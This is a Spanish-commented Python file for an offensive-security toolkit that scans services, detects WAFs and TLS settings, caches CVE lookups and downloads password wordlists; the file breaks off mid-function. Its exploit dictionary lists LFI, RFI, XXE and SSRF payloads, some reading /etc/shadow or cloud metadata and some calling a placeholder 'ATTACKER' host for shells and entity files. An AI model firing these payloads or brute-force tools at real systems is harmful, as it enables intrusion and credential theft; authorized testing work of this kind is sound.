#!/usr/bin/env python3
"""
================================================================================
  XPL TOOLKIT v2 — Advanced Vulnerability Exploitation Framework
  Basado en la skill "xpl" de Manus
  Todas las mejoras implementadas:
    1. Automatización paralela (threading)
    2. UI/UX mejorada (menús, barras de progreso, colores)
    3. Detección avanzada (WAF, SSL/TLS, fingerprinting profundo)
    4. Caché SQLite de CVEs (no repetir peticiones al NVD)
    5. Modo batch / no interactivo (cron, pipelines)
    6. Reportes mejorados (HTML con gráficos Plotly)
    7. Exploits adicionales (LFI/RFI, XXE, SSRF, deserialization)
    8. Seguridad (sanitización, rate-limiting, log de auditoría)
    9. Wordlist management (descarga, merge, dedup)
    10. Logging robusto con rotación
================================================================================
"""

# =============================================================================
#  IMPORTS
# =============================================================================
import os
import sys
import re
import json
import csv
import time
import hashlib
import datetime
import subprocess
import argparse
import shlex
import shutil
import sqlite3
import logging
import logging.handlers
import socket
import ssl
import io
import signal
import ipaddress
import urllib.parse
import urllib.request
import urllib.error
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional
from html import escape as html_escape

# =============================================================================
#  CONFIGURACIÓN GLOBAL
# =============================================================================

VERSION = "2.1.0"
# La clave se obtiene del entorno; nunca debe almacenarse en el repositorio.
NVD_API_KEY = os.getenv("NVD_API_KEY", "")
SESSIONS_DIR = os.path.expanduser("/home/ubuntu/sessions")
SKILL_DIR = os.path.expanduser("/home/ubuntu/skills/xpl")
TOOLKIT_DIR = os.path.dirname(os.path.abspath(__file__))
CACHE_DIR = os.path.join(TOOLKIT_DIR, ".cache")
DB_PATH = os.path.join(CACHE_DIR, "xpl_cache.db")
AUDIT_LOG = os.path.join(TOOLKIT_DIR, "audit.log")
WORDLISTS_DIR = os.path.join(TOOLKIT_DIR, "wordlists")

# Wordlists integradas de la skill
WORDLISTS = {
    "ssh_users": os.path.join(SKILL_DIR, "references/wordlists/ssh_users.txt"),
    "ssh_pass":   os.path.join(SKILL_DIR, "references/wordlists/ssh_pass.txt"),
    "web_common": os.path.join(SKILL_DIR, "references/wordlists/web_common.txt"),
    "db_default": os.path.join(SKILL_DIR, "references/wordlists/db_default.txt"),
}

SECLISTS_URLS = {
    "fast_track_users":    "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/Names/names.txt",
    "fast_track_pass":     "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000.txt",
    "web_directories":     "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt",
    "subdomains":          "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/subdomains-top1million-5000.txt",
}

NMAP_SCRIPTS = {
    "general":  "vuln,auth,default",
    "http":     "http-vuln-*,http-enum,http-auth,http-methods",
    "smb":      "smb-vuln-*,smb-enum-shares,smb-os-discovery,smb-vuln-ms17-010",
    "ssh":      "ssh-auth-methods,ssh-run,ssh2-enum-algos",
    "ftp":      "ftp-anon,ftp-vuln-*,ftp-syst,ftp-vsftpd-backdoor",
    "database": "mysql-vuln-*,postgresql-vuln-*,ms-sql-info,mysql-empty-password",
    "rdp":      "rdp-vuln-ms12-020,rdp-ntlm-info,rdp-enum-encryption",
    "ssl":      "ssl-enum-ciphers,ssl-cert,ssl-heartbleed,ssl-poodle",
}

SERVICE_DETECTION = {
    "ssh":      {"port": 22,   "tools": ["hydra", "medusa"],       "scripts": "ssh"},
    "ftp":      {"port": 21,   "tools": ["hydra"],                 "scripts": "ftp"},
    "smb":      {"port": 445,  "tools": ["smbclient", "enum4linux","impacket"], "scripts": "smb"},
    "http":     {"port": 80,   "tools": ["httpx", "nmap", "gobuster","wfuzz"], "scripts": "http"},
    "https":    {"port": 443,  "tools": ["httpx", "nmap", "gobuster","wfuzz"], "scripts": "http"},
    "mysql":    {"port": 3306, "tools": ["hydra", "mysql"],        "scripts": "database"},
    "postgres": {"port": 5432, "tools": ["hydra", "psql"],         "scripts": "database"},
    "mssql":    {"port": 1433, "tools": ["hydra", "impacket"],     "scripts": "database"},
    "rdp":      {"port": 3389, "tools": ["hydra", "xfreerdp"],     "scripts": "rdp"},
    "dns":      {"port": 53,   "tools": ["dig", "dnsrecon"],       "scripts": "general"},
}

AUTHORIZATION_CHOICES = {
    "1": {"label": "Authorized pentest — proceed",       "action": "full"},
    "2": {"label": "CTF / Lab environment — proceed",    "action": "full"},
    "3": {"label": "Verify only, don't exploit",         "action": "verify"},
    "4": {"label": "Cancel",                              "action": "cancel"},
}

REQUIRED_TOOLS = {
    "nmap":        {"install": "sudo apt-get install -y nmap",                   "pkg": "nmap"},
    "hydra":       {"install": "sudo apt-get install -y hydra",                  "pkg": "hydra"},
    "sqlmap":      {"install": "sudo apt-get install -y sqlmap",                 "pkg": "sqlmap"},
    "searchsploit":{"install": "sudo apt-get install -y exploitdb",              "pkg": "exploitdb"},
    "httpx":       {"install": "go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest", "pkg": "httpx"},
    "cewl":        {"install": "sudo apt-get install -y cewl",                   "pkg": "cewl"},
    "gcc":         {"install": "sudo apt-get install -y gcc g++",                "pkg": "gcc"},
    "subfinder":   {"install": "go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest", "pkg": "subfinder"},
    "enum4linux":  {"install": "sudo apt-get install -y enum4linux",             "pkg": "enum4linux"},
    "smbclient":   {"install": "sudo apt-get install -y smbclient",              "pkg": "smbclient"},
    "gobuster":    {"install": "sudo apt-get install -y gobuster",               "pkg": "gobuster"},
    "metasploit":  {"install": "sudo apt-get install -y metasploit-framework",   "pkg": "metasploit-framework", "binary": "msfconsole"},
    "wfuzz":       {"install": "sudo apt-get install -y wfuzz",                  "pkg": "wfuzz"},
    "dig":         {"install": "sudo apt-get install -y dnsutils",               "pkg": "dnsutils"},
    "curl":        {"install": "sudo apt-get install -y curl",                   "pkg": "curl"},
    "jq":          {"install": "sudo apt-get install -y jq",                     "pkg": "jq"},
}

# Exploit templates adicionales
ADDITIONAL_EXPLOITS = {
    "lfi": {
        "name": "Local File Inclusion",
        "payloads": [
            "/etc/passwd", "/etc/shadow", "/proc/self/environ",
            "/var/log/auth.log", "/var/log/apache2/access.log",
            "php://filter/convert.base64-encode/resource=config.php",
            "/var/www/html/config.php", "/etc/hosts",
            "file:///etc/passwd", "expect://id",
        ],
        "test_params": ["page", "file", "include", "path", "doc", "document", "folder", "root", "pg", "style", "pdf", "template", "php_path", "src"],
    },
    "rfi": {
        "name": "Remote File Inclusion",
        "payloads": [
            "http://ATTACKER/shell.txt?", "http://ATTACKER/shell.txt%00",
            "ftp://ATTACKER/shell.txt", "php://input",
        ],
        "test_params": ["page", "file", "include", "path", "doc", "template", "inc"],
    },
    "xxe": {
        "name": "XML External Entity",
        "payloads": [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://ATTACKER/oob">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER/evil.dtd">%xxe;]><foo>bar</foo>',
        ],
        "content_types": ["application/xml", "text/xml", "application/soap+xml"],
    },
    "ssrf": {
        "name": "Server-Side Request Forgery",
        "payloads": [
            "http://127.0.0.1", "http://localhost", "http://169.254.169.254/latest/meta-data/",
            "http://0.0.0.0", "http://[::1]", "http://127.0.0.1:8080",
            "http://metadata.google.internal/", "http://192.168.1.1",
            "dict://localhost:11211/", "gopher://127.0.0.1:6379/",
            "file:///etc/passwd",
        ],
        "test_params": ["url", "uri", "path", "dest", "redirect", "web", "html", "domain", "host", "feed", "rss"],
    },
    "deserialization": {
        "name": "Insecure Deserialization",
        "payloads": {
            "java": {"check": "ACED", "description": "Java serialized object marker"},
            "python": {"check": "cos\nsystem", "description": "Python pickle deserialization"},
            "php":    {"check": 'O:', "description": "PHP serialized object"},
            "ruby":   {"check": "--- !ruby/object", "description": "Ruby YAML deserialization"},
        },
    },
}


# =============================================================================
#  LOGGING Y AUDITORÍA
# =============================================================================

def setup_logging(log_dir):
    """Configura logging robusto con rotación."""
    os.makedirs(log_dir, exist_ok=True)
    log_file = os.path.join(log_dir, "xpl_toolkit.log")

    logger = logging.getLogger("xpl_toolkit")
    logger.setLevel(logging.DEBUG)
    # Evita duplicar líneas si la función se invoca más de una vez.
    for handler in logger.handlers[:]:
        handler.close()
        logger.removeHandler(handler)

    # File handler con rotación
    fh = logging.handlers.RotatingFileHandler(
        log_file, maxBytes=5*1024*1024, backupCount=3, encoding="utf-8"
    )
    fh.setLevel(logging.DEBUG)
    fh.setFormatter(logging.Formatter(
        "%(asctime)s | %(levelname)-8s | %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S"
    ))
    logger.addHandler(fh)

    # Console handler (solo warnings+)
    ch = logging.StreamHandler()
    ch.setLevel(logging.WARNING)
    ch.setFormatter(logging.Formatter("%(levelname)s: %(message)s"))
    logger.addHandler(ch)

    return logger


def log_audit(action, target="", detail="", severity="info"):
    """Registro de auditoría para todas las acciones."""
    timestamp = datetime.datetime.now().isoformat()
    entry = {
        "timestamp": timestamp,
        "action": action,
        "target": target,
        "detail": detail,
        "severity": severity,
    }
    try:
        with open(AUDIT_LOG, "a", encoding="utf-8") as f:
            f.write(json.dumps(entry, ensure_ascii=False) + "\n")
    except Exception:
        pass


# =============================================================================
#  UTILIDADES DE UI/UX
# =============================================================================

class Colors:
    RESET  = "\033[0m"
    RED    = "\033[91m"
    GREEN  = "\033[92m"
    YELLOW = "\033[93m"
    BLUE   = "\033[94m"
    MAGENTA= "\033[95m"
    CYAN   = "\033[96m"
    WHITE  = "\033[97m"
    BOLD   = "\033[1m"
    DIM    = "\033[2m"
    BG_RED = "\033[41m"
    BG_GREEN="\033[42m"
    BG_YELLOW="\033[43m"

def cc(text, code):
    return f"{code}{text}{Colors.RESET}"

def banner():
    print(cc(f"""
  ███████╗██╗   ██╗███████╗████████╗███████╗███╗   ███╗
  ██╔════╝╚██╗ ██╔╝██╔════╝╚══██╔══╝██╔════╝████╗ ████║
  ███████╗ ╚████╔╝ ███████╗   ██║   █████╗  ██╔████╔██║
  ╚════██║  ╚██╔╝  ╚════██║   ██║   ██╔══╝  ██║╚██╔╝██║
  ███████║   ██║   ███████║   ██║   ███████╗██║ ╚═╝ ██║
  ╚══════╝   ╚═╝   ╚══════╝   ╚═╝   ╚══════╝╚═╝     ╚═╝
  ╔═══════════════════════════════════════════════════════╗
  ║  XPL TOOLKIT v{VERSION} — Advanced Vulnerability Framework   ║
  ╚═══════════════════════════════════════════════════════╝
""", Colors.CYAN))

def section(title, char="═"):
    print(f"\n{cc(char*65, Colors.BLUE)}")
    print(f"  {cc(title, Colors.BOLD)}")
    print(f"{cc(char*65, Colors.BLUE)}\n")

def progress_bar(current, total, label="", width=40):
    """Barra de progreso visual."""
    pct = current / total if total > 0 else 0
    filled = int(width * pct)
    bar = "█" * filled + "░" * (width - filled)
    print(f"\r  {label} [{bar}] {pct*100:.0f}% ({current}/{total})", end="", flush=True)
    if current >= total:
        print()

def spinner(text, done_event, success_text="OK"):
    """Spinner animado para operaciones en segundo plano."""
    chars = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
    i = 0
    while not done_event.is_set():
        print(f"\r  {cc(chars[i % len(chars)], Colors.CYAN)} {text}...", end="", flush=True)
        i += 1
        time.sleep(0.1)
    print(f"\r  {cc('[OK]', Colors.GREEN)} {success_text}            ")

def menu(title, options):
    """Menú interactivo con opciones numeradas."""
    print(f"\n  {cc(title, Colors.BOLD)}")
    print()
    for key, val in options.items():
        label = val if isinstance(val, str) else val.get("label", str(val))
        print(f"    {cc(f'{key})', Colors.CYAN)} {label}")
    print()
    return input(f"  {cc('Selecciona:', Colors.YELLOW)} ").strip()

def confirm(msg, default="n"):
    """Solicita confirmación sí/no."""
    d = "[S/n]" if default.lower() == "s" else "[s/N]"
    resp = input(f"  {msg} {d}: ").strip().lower()
    if not resp:
        resp = default.lower()
    return resp in ("s", "si", "y", "yes", "true")


# =============================================================================
#  SEGURIDAD — SANITIZACIÓN Y RATE-LIMITING
# =============================================================================

class Security:
    """Módulo de seguridad del toolkit."""

    @staticmethod
    def sanitize(text):
        """Limpia strings peligrosos."""
        if not isinstance(text, str):
            text = str(text)
        return re.sub(r'[^a-zA-Z0-9._\-]', '_', text)

    @staticmethod
    def validate_target(target):
        """Valida una IP o nombre DNS sin aceptar URLs ni argumentos de shell."""
        if not isinstance(target, str):
            return False, None
        target = target.strip()
        if not target or len(target) > 253 or any(c in target for c in "\r\n"):
            return False, None

        try:
            ipaddress.ip_address(target)
            return True, target
        except ValueError:
            pass

        labels = target.rstrip(".").split(".")
        if not all(
            label and len(label) <= 63
            and re.fullmatch(r"[A-Za-z0-9](?:[A-Za-z0-9-]*[A-Za-z0-9])?", label)
            for label in labels
        ):
            return False, None
        return True, target.rstrip(".")

    @staticmethod
    def validate_port(port):
        try:
            value = int(port)
        except (TypeError, ValueError):
            return False
        return 1 <= value <= 65535

    @staticmethod
    def sanitize_path(path):
        """Previene path traversal."""
        return os.path.normpath(path).replace("..", "")


# =============================================================================
#  CACHÉ SQLITE DE CVEs
# =============================================================================

class CVECache:
    """Caché local de CVEs en SQLite para evitar repetir peticiones al NVD."""

    def __init__(self, db_path=DB_PATH):
        os.makedirs(os.path.dirname(db_path), exist_ok=True)
        self.conn = sqlite3.connect(db_path)
        self.conn.execute("PRAGMA journal_mode=WAL")
        self._create_tables()

    def _create_tables(self):
        self.conn.execute("""
            CREATE TABLE IF NOT EXISTS cve_cache (
                query_hash TEXT PRIMARY KEY,
                query TEXT NOT NULL,
                results_json TEXT NOT NULL,
                total_results INTEGER DEFAULT 0,
                created_at TEXT NOT NULL,
                expires_at TEXT NOT NULL
            )
        """)
        self.conn.execute("""
            CREATE INDEX IF NOT EXISTS idx_query ON cve_cache(query)
        """)
        self.conn.commit()

    def _hash(self, query):
        return hashlib.sha256(query.lower().strip().encode()).hexdigest()

    def get(self, query, max_age_hours=24):
        h = self._hash(query)
        try:
            max_age_hours = max(0, float(max_age_hours))
        except (TypeError, ValueError):
            max_age_hours = 24
        row = self.conn.execute(
            "SELECT results_json, total_results FROM cve_cache "
            "WHERE query_hash=? AND expires_at > datetime('now') "
            "AND created_at > datetime('now', ?)",
            (h, f"-{max_age_hours:g} hours")
        ).fetchone()
        if row:
            return json.loads(row[0]), row[1]
        return None, 0

    def put(self, query, results, total):
        h = self._hash(query)
        self.conn.execute(
            "INSERT OR REPLACE INTO cve_cache (query_hash, query, results_json, total_results, created_at, expires_at) VALUES (?,?,?,?,datetime('now'),datetime('now','+1 day'))",
            (h, query, json.dumps(results, ensure_ascii=False), total)
        )
        self.conn.commit()

    def stats(self):
        row = self.conn.execute("SELECT COUNT(*), COUNT(DISTINCT query) FROM cve_cache").fetchone()
        return {"total_entries": row[0], "unique_queries": row[1]}

    def close(self):
        if self.conn:
            self.conn.close()
            self.conn = None


# =============================================================================
#  GESTIÓN DE SESIÓN
# =============================================================================

def sanitize(text):
    return re.sub(r'[^a-zA-Z0-9._\-]', '_', str(text))

def init_session(target):
    """Inicializa la estructura de sesión."""
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    target_sanitized = Security.sanitize(target)
    session_name = f"{target_sanitized}_{timestamp}"
    base_dir = os.path.join(SESSIONS_DIR, session_name)
    assets_dir = os.path.join(base_dir, "assets")
    logs_dir = os.path.join(base_dir, "logs")

    os.makedirs(assets_dir, exist_ok=True)
    os.makedirs(logs_dir, exist_ok=True)

    session_md = os.path.join(base_dir, "session.md")
    with open(session_md, "w") as f:
        f.write(f"# Session: {target}\n\n")
        f.write(f"- **Target**: {target}\n")
        f.write(f"- **Start Time**: {timestamp}\n")
        f.write(f"- **Status**: IN PROGRESS\n")
        f.write(f"- **Toolkit Version**: {VERSION}\n\n")
        f.write("## Timeline\n")
        f.write("| Timestamp | Action | Result |\n")
        f.write("| :--- | :--- | :--- |\n")
        f.write(f"| {timestamp} | Session Created | v{VERSION} |\n")

    log_audit("SESSION_CREATED", target, f"Dir: {base_dir}")
    return base_dir

def log_to_session(session_dir, action, result="—"):
    if not session_dir:
        return
    session_md = os.path.join(session_dir, "session.md")
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    with open(session_md, "a") as f:
        f.write(f"| {timestamp} | {action} | {result} |\n")

def update_session_status(session_dir, status):
    if not session_dir:
        return
    session_md = os.path.join(session_dir, "session.md")
    if not os.path.exists(session_md):
        return
    with open(session_md, "r") as f:
        content = f.read()
    content = re.sub(r'\*\*Status\*\*: \w+', f"**Status**: {status}", content)
    with open(session_md, "w") as f:
        f.write(content)


# =============================================================================
#  VERIFICACIÓN E INSTALACIÓN DE HERRAMIENTAS
# =============================================================================

def tool_command(name):
    """Devuelve el binario real de una herramienta configurada."""
    return REQUIRED_TOOLS.get(name, {}).get("binary", name)


def tool_installed(name):
    return shutil.which(tool_command(name)) is not None

def check_and_install_tools(selected=None, interactive=True):
    """Verifica herramientas e instala las faltantes."""
    section("VERIFICACIÓN DE HERRAMIENTAS")

    tools = selected or list(REQUIRED_TOOLS.keys())
    installed = []
    missing = []

    for tool in tools:
        if tool_installed(tool):
            installed.append(tool)
            print(f"  {cc('[OK]', Colors.GREEN)} {tool}")
        else:
            missing.append(tool)
            print(f"  {cc('[MISSING]', Colors.YELLOW)} {tool}")

    print(f"\n  Instaladas: {cc(str(len(installed)), Colors.GREEN)} / {cc(str(len(tools)), Colors.BOLD)}")
    if missing:
        print(f"  Faltantes:  {cc(', '.join(missing), Colors.RED)}")

    if missing and interactive:
        if confirm("¿Instalar herramientas faltantes?", "s"):
            for tool in missing:
                cfg = REQUIRED_TOOLS.get(tool, {})
                cmd = cfg.get("install", "")
                if not cmd:
                    continue
                print(f"  Instalando {cc(tool, Colors.CYAN)}...", end=" ")
                try:
                    result = subprocess.run(
                        shlex.split(cmd), capture_output=True, text=True, timeout=180
                    )
                    if result.returncode == 0:
                        print(cc("OK", Colors.GREEN))
                        log_audit("TOOL_INSTALLED", tool)
                    else:
                        print(cc("FAIL", Colors.RED))
                except subprocess.TimeoutExpired:
                    print(cc("TIMEOUT", Colors.RED))
                except Exception as e:
                    print(cc(f"ERROR: {e}", Colors.RED))
    elif missing:
        info("Modo no interactivo: no se instalarán herramientas automáticamente.")

    return installed + [t for t in missing if tool_installed(t)]


# =============================================================================
#  DETECCIÓN AUTOMÁTICA DE SERVICIOS
# =============================================================================

def detect_services(target):
    """Detecta servicios abiertos con Nmap."""
    step_info(0, "Detección Automática de Servicios")
    services = []

    if not tool_installed("nmap"):
        warn("nmap no disponible.")
        return services

    print(f"  Escaneando top 1000 puertos en {cc(target, Colors.BOLD)}...", end=" ")
    try:
        result = subprocess.run(
            ["nmap", "-sV", "-Pn", "--top-ports", "1000", "--open", "-q", target],
            capture_output=True, text=True, timeout=300
        )
        output = result.stdout

        for line in output.split('\n'):
            match = re.match(r'\s*(\d+)/tcp\s+open\s+(\S+)\s+(.*)', line)
            if match:
                svc = {
                    "port": match.group(1),
                    "service": match.group(2),
                    "version": match.group(3).strip(),
                }
                for kname, kcfg in SERVICE_DETECTION.items():
                    if kname in svc["service"].lower():
                        svc["mapped"] = kname
                        break
                services.append(svc)

        print(cc(f"{len(services)} servicios", Colors.GREEN))
        for s in services:
            print(f"      {cc(s['port'], Colors.CYAN)}/tcp  {s['service']:<15} {s['version']}")

        log_audit("SERVICE_DETECTED", target, f"{len(services)} services")
    except Exception as e:
        warn(f"Error: {e}")

    return services


# =============================================================================
#  DETECCIÓN AVANZADA (WAF, SSL/TLS, Fingerprinting)
# =============================================================================

def advanced_detection(target, session_dir):
    """Detección avanzada: WAF, SSL/TLS, banners, tech fingerprinting."""
    step_info(2, "Detección Avanzada")
    results = {}

    # --- SSL/TLS Analysis ---
    print(f"  Analizando SSL/TLS de {target}...", end=" ")
    tls_info = analyze_tls(target)
    results["tls"] = tls_info
    print(cc("OK" if tls_info else "SKIP", Colors.GREEN))

    # --- WAF Detection ---
    print(f"  Detectando WAF en {target}...", end=" ")
    waf_info = detect_waf(target)
    results["waf"] = waf_info
    print(cc(f"{'DETECTED' if waf_info else 'NONE'}", Colors.YELLOW if waf_info else Colors.GREEN))

    # --- Banner Grabbing ---
    print(f"  Capturando banners...", end=" ")
    banners = grab_banners(target)
    results["banners"] = banners
    print(cc(f"{len(banners)} banners", Colors.GREEN))

    # Guardar resultados
    if session_dir:
        adv_file = os.path.join(session_dir, "assets/advanced_detection.json")
        with open(adv_file, "w") as f:
            json.dump(results, f, indent=2, ensure_ascii=False)

    log_to_session(session_dir, "Advanced detection", f"WAF={waf_info}, TLS={'OK' if tls_info else 'N/A'}")
    return results


def analyze_tls(target):
    """Analiza la configuración SSL/TLS de un objetivo."""
    info = {"supported": [], "certificate": {}, "warnings": []}

    for tls_ver in (ssl.TLSVersion.TLSv1_2, ssl.TLSVersion.TLSv1_3):
        try:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.minimum_version = tls_ver
            ctx.maximum_version = tls_ver
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            ctx.set_ciphers("ALL:@SECLEVEL=0")
            with socket.create_connection((target, 443), timeout=10) as sock:
                with ctx.wrap_socket(sock, server_hostname=target) as ssock:
                    cipher = ssock.cipher()
                    cert = ssock.getpeercert()
                    info["supported"].append(tls_ver.name)
                    info["certificate"] = {
                        "subject": dict(x[0] for x in cert.get("subject", ())),
                        "issuer": dict(x[0] for x in cert.get("issuer", ())),
                        "not_after": cert.get("notAfter", ""),
                        "not_before": cert.get("notBefore", ""),
                    }
                    if "TLSv1.2" in tls_ver.name:
                        info["warnings"].append("TLSv1.2 should be upgraded to TLSv1.3")
        except Exception:
            pass

    return info


def detect_waf(target):
    """Detecta WAF enviando payloads de prueba y analizando respuestas."""
    waf_indicators = {
        "cloudflare":  ["cloudflare", "cf-ray", "__cfduid"],
        "aws_waf":     ["x-amzn-requestid", "aws.waf"],
        "akamai":      ["akamai", "akamaighost"],
        "barracuda":   ["barra_counter_session", "bnids"],
        "f5_bigip":    ["bigipserver", "f5"],
        "sucuri":      ["sucuri/", "sucuri.net"],
        "fortinet":    ["forti_guard"],
        "imperva":     ["incap_", "visid_incap_"],
        "mod_security":["mod_security", "modsec", "not acceptable"],
        "generic":     ["blocked", "forbidden", "access denied", "waf"],
    }

    wafs_found = []

    try:
        # Comprobación pasiva: no se envían payloads de explotación en verify.
        req = urllib.request.Request(
            f"https://{target}/", headers={"User-Agent": "XPL-Toolkit/2.1 WAF-Check"}
        )
        try:
            with urllib.request.urlopen(req, timeout=5) as resp:
                headers = dict(resp.headers)
                body = resp.read(2000).decode("utf-8", errors="replace")
        except urllib.error.HTTPError as e:
            headers = dict(e.headers) if e.headers else {}
            body = e.read(2000).decode("utf-8", errors="replace") if e.fp else ""
        except Exception:
            return None

        response_text = " ".join(str(headers).lower().split()) + " " + body.lower()
        for waf_name, patterns in waf_indicators.items():
            if any(p in response_text for p in patterns):
                wafs_found.append(waf_name)
    except Exception:
        pass

    return wafs_found if wafs_found else None


def grab_banners(target):
    """Captura banners de servicios abiertos."""
    banners = []
    common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 993, 995, 3306, 5432, 8080, 8443]

    def grab_one(port):
        try:
            sock = socket.create_connection((target, port), timeout=5)
            sock.settimeout(3)
            data = b""
            try:
                while True:
                    chunk = sock.recv(1024)
                    if not chunk:
                        break
                    data += chunk
            except socket.timeout:
                pass
            sock.close()
            if data:
                return {"port": port, "banner": data[:200].decode("utf-8", errors="replace").strip()}
        except Exception:
            pass
        return None

    with ThreadPoolExecutor(max_workers=8) as pool:
        futures = {pool.submit(grab_one, p): p for p in common_ports}
        for future in as_completed(futures):
            result = future.result()
            if result:
                banners.append(result)

    return banners


# =============================================================================
#  CVE LOOKUP (con caché + API key + paralelización)
# =============================================================================

SEVERITY_ORDER = {"LOW": 1, "MEDIUM": 2, "MODERATE": 2, "HIGH": 3, "CRITICAL": 4}
NVD_API_URL = "https://services.nvd.nist.gov/rest/json/cves/2.0"

def extract_cvss(cve_obj):
    metrics = cve_obj.get("metrics", {})
    for key in ("cvssMetricV31", "cvssMetricV30", "cvssMetricV2"):
        if key in metrics and metrics[key]:
            entry = metrics[key][0]
            d = entry.get("cvssData", {})
            return d.get("baseScore"), entry.get("baseSeverity") or d.get("baseSeverity"), d.get("vectorString", "")
    return None, None, ""

def extract_description(cve_obj, lang="en"):
    for desc in cve_obj.get("descriptions", []):
        if desc.get("lang") == lang:
            return desc.get("value", "")
    descs = cve_obj.get("descriptions", [])
    return descs[0].get("value", "") if descs else ""

def parse_cve_results(raw_vulns):
    parsed = []
    for item in raw_vulns:
        cve_obj = item.get("cve", {})
        score, severity, vector = extract_cvss(cve_obj)
        parsed.append({
            "cve_id": cve_obj.get("id", "N/A"),
            "published": cve_obj.get("published", ""),
            "cvss_score": score,
            "severity": severity,
            "vector": vector,
            "description": extract_description(cve_obj),
        })
    return parsed

def fetch_cves_cached(query, limit=50, min_severity=None, api_key=NVD_API_KEY):
    """Busca CVEs con caché local y reintentos limitados ante rate limiting."""
    if not isinstance(query, str) or not query.strip():
        warn("La consulta CVE no puede estar vacía.")
        return []
    try:
        limit = max(1, min(int(limit), 2000))
    except (TypeError, ValueError):
        limit = 50

    cache = CVECache()
    cached, total = cache.get(query)
    if cached is not None:
        print(f"  {cc('[CACHÉ]', Colors.DIM)} Resultados cacheados ({len(cached)} CVEs)")
        cache.close()
        results = cached
    else:
        all_vulns = []
        start_index = 0
        page_size = min(limit, 200) if limit else 200
        delay = 0.6 if api_key else 6

        print(f"  {cc('[API]', Colors.CYAN)} Consultando NVD para: {query}")
        print(f"  {cc(f'API Key: {api_key[:8]}...', Colors.DIM)}")

        retries = 0
        while True:
            params = {
                "keywordSearch": query,
                "startIndex": str(start_index),
                "resultsPerPage": str(page_size),
            }
            url = f"{NVD_API_URL}?{urllib.parse.urlencode(params)}"
            req = urllib.request.Request(url, headers={"User-Agent": "XPL-Toolkit/2.0"})
            if api_key:
                req.add_header("apiKey", api_key)

            try:
                with urllib.request.urlopen(req, timeout=30) as resp:
                    data = json.loads(resp.read().decode("utf-8"))
            except urllib.error.HTTPError as e:
                if e.code == 403 and retries < 3:
                    retries += 1
                    wait_seconds = min(30 * retries, 90)
                    warn(f"Rate limit. Reintento {retries}/3 en {wait_seconds}s...")
                    time.sleep(wait_seconds)
                    continue
                error(f"HTTP {e.code}: {e.reason}")
                break
            except urllib.error.URLError as e:
                error(f"Red: {e.reason}")
                break

            retries = 0
            vulns = data.get("vulnerabilities", [])
            all_vulns.extend(vulns)
            total = data.get("totalResults", len(all_vulns))
            print(f"  ... {len(all_vulns)}/{total} resultados")

            start_index += page_size
            if limit and len(all_vulns) >= limit:
                all_vulns = all_vulns[:limit]
                break
            if start_index >= total:
                break
            time.sleep(delay)

        raw_results = parse_cve_results(all_vulns)
        cache.put(query, raw_results, total)
        cache.close()
        results = raw_results

    # Filtrar severidad
    if min_severity:
        threshold = SEVERITY_ORDER.get(min_severity.upper(), 0)
        results = [r for r in results
                   if SEVERITY_ORDER.get((r["severity"] or "").upper(), 0) >= threshold]

    log_audit("CVE_LOOKUP", query, f"{len(results)} results")
    return results

def print_cve_table(results):
    if not results:
        print(f"  {cc('No se encontraron CVEs.', Colors.YELLOW)}")
        return
    print(f"\n  {cc('CVE ID', Colors.BOLD):<18} {cc('Severidad', Colors.BOLD):<10} {cc('CVSS', Colors.BOLD):<6} {cc('Publicado', Colors.BOLD):<12} Descripción")
    print(f"  {'-'*100}")
    for r in results:
        score = f"{r['cvss_score']:.1f}" if r["cvss_score"] is not None else "N/A"
        sev = r["severity"] or "N/A"
        pub = r["published"][:10] if r["published"] else "N/A"
        desc = (r["description"][:70] + "...") if len(r["description"]) > 70 else r["description"]
        color_sev = Colors.RED if sev in ("CRITICAL", "HIGH") else Colors.YELLOW if sev == "MEDIUM" else Colors.GREEN
        print(f"  {r['cve_id']:<18} {cc(sev, color_sev):<10} {score:<6} {pub:<12} {desc}")
    print(f"\n  Total: {cc(str(len(results)), Colors.BOLD)} CVE(s)")

def export_cve_results(results, fmt, path):
    if fmt == "json":
        with open(path, "w", encoding="utf-8") as f:
            json.dump(results, f, indent=2, ensure_ascii=False)
    elif fmt == "csv":
        fields = ["cve_id", "published", "cvss_score", "severity", "vector", "description"]
        with open(path, "w", newline="", encoding="utf-8") as f:
            w = csv.DictWriter(f, fieldnames=fields)
            w.writeheader()
            w.writerows(results)
    success(f"Exportado a {path}")


# =============================================================================
#  WORDLIST MANAGEMENT
# =============================================================================

def download_sec_lists():
    """Descarga wordlists de SecLists."""
    section("Descarga de Wordlists (SecLists)")
    os.makedirs(WORDLISTS_DIR, exist_ok=True)
    downloaded = []

    for name, url in SECLISTS_URLS.items():
        out_path = os.path.join(WORDLISTS_DIR, f"{name}.txt")
        print(f"  Descargando {name}...", end=" ")
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "XPL-Toolkit/2.0"})
            with urllib.request.urlopen(req, timeout=30) as resp:
                data = resp.read().decode("utf-8", errors="replace")
            with open(out_path, "w", encoding="utf-8") as f:
                f.write(data)
            count = len([l for l in data.split('\n') if l.strip()])
            print(cc(f"{count} entradas", Colors.GREEN))
            downloaded.append((name, count))
        except Exception as e:
            print(cc(f"ERROR: {e}", Colors.RED))

    for name, count in downloaded:
        print(f"  {cc(name, Colors.CYAN)}: {count} entradas")

def merge_wordlists(file_list, output_path, dedup=True):
